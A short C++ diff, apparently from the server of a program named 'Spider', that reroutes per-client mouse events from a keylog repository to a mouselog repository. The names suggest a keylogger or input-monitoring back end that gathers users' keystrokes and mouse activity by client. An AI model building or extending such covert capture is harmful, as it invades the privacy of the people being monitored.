@@ -43,7 +43,7 @@ public:
         });
 
         _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
-            _keylogRepository->PushElement("mouselog" + clientId, payload);
+            _mouselogRepository->PushElement("mouselog" + clientId, payload);
         });
     }
 };
